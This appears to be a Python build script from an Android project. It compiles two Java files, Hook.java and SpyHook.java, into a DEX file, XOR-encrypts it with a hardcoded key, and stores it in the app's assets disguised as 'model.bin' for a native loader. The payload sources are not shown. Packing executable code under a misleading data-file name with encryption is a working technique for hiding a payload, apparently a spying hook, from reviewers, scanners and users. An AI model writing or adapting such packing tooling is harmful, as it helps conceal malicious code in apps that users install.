#!/usr/bin/env python3
"""Compile Hook.java + SpyHook.java → payload.dex → XOR encrypt → app/src/main/assets/model.bin"""
import subprocess, os, shutil, sys

HERE = os.path.dirname(os.path.abspath(__file__))
ASSETS = os.path.join(HERE, "..", "app", "src", "main", "assets")
SOURCES = [
    os.path.join(HERE, "Hook.java"),
    os.path.join(HERE, "SpyHook.java"),
]
TMP_CLASSES = os.path.join(HERE, "tmp_classes")
TMP_DEX = os.path.join(HERE, "tmp.dex")
OUT = os.path.join(ASSETS, "model.bin")

# Key must match shield.c
KEY = bytes([0x4A, 0x7D, 0x2B, 0x6F, 0x1C, 0x5E, 0x3A, 0x8F])

def find_sdk():
    sdk = os.environ.get("ANDROID_SDK_ROOT") or os.environ.get("ANDROID_HOME")
    if sdk: return sdk
    home = os.path.expanduser("~")
    for p in [os.path.join(home, "Android", "Sdk"),
              os.path.join(home, "android", "sdk"),
              os.path.join(home, ".android", "sdk")]:
        if os.path.isdir(p): return p
    return None

def find_build_tools(sdk):
    if not sdk: return None
    bt = os.path.join(sdk, "build-tools")
    if not os.path.isdir(bt): return None
    vers = sorted(os.listdir(bt), reverse=True)
    return os.path.join(bt, vers[0]) if vers else None

def main():
    sdk = find_sdk()
    if not sdk:
        print("FAIL: ANDROID_SDK_ROOT not set and no SDK found")
        sys.exit(1)
    bt = find_build_tools(sdk)
    if not bt:
        print(f"FAIL: no build-tools in {sdk}/build-tools")
        sys.exit(1)

    android_jar = os.path.join(sdk, "platforms", "android-34", "android.jar")
    if not os.path.exists(android_jar):
        for v in ["android-33", "android-32", "android-31", "android-30"]:
            p = os.path.join(sdk, "platforms", v, "android.jar")
            if os.path.exists(p):
                android_jar = p
                break

    d8 = os.path.join(bt, "d8")
    dx = os.path.join(bt, "dx")
    dexer = d8 if os.path.exists(d8) else dx

    javac = shutil.which("javac")
    if not javac:
        java_home = os.environ.get("JAVA_HOME")
        if java_home:
            javac = os.path.join(java_home, "bin", "javac")
    if not javac:
        print("FAIL: javac not found")
        sys.exit(1)

    os.makedirs(TMP_CLASSES, exist_ok=True)
    os.makedirs(ASSETS, exist_ok=True)

    # Check all source files exist
    for s in SOURCES:
        if not os.path.exists(s):
            print(f"FAIL: source not found {s}")
            sys.exit(1)

    # Compile both source files together (Hook.java + SpyHook.java)
    cmd = [javac, "-d", TMP_CLASSES, "-cp", android_jar] + SOURCES
    r = subprocess.run(cmd, capture_output=True, text=True)
    if r.returncode != 0:
        print(f"FAIL: javac error:\n{r.stderr}")
        sys.exit(1)

    # DEX the compiled classes
    if dexer.endswith("d8"):
        cmd = [dexer, "--lib", android_jar, "--output", TMP_DEX, TMP_CLASSES]
    else:
        cmd = [dexer, "--dex", "--output", TMP_DEX, TMP_CLASSES]
    r = subprocess.run(cmd, capture_output=True, text=True)
    if r.returncode != 0:
        print(f"FAIL: dexer error:\n{r.stderr}")
        sys.exit(1)

    # Read and XOR encrypt
    with open(TMP_DEX, "rb") as f:
        data = f.read()
    encrypted = bytes(data[i] ^ KEY[i & 7] for i in range(len(data)))
    with open(OUT, "wb") as f:
        f.write(encrypted)

    print(f"OK: {len(data)} bytes DEX -> {OUT} ({len(encrypted)} encrypted)")

    # Cleanup
    if os.path.isdir(TMP_CLASSES):
        shutil.rmtree(TMP_CLASSES)
    if os.path.isfile(TMP_DEX):
        os.remove(TMP_DEX)

if __name__ == "__main__":
    main()
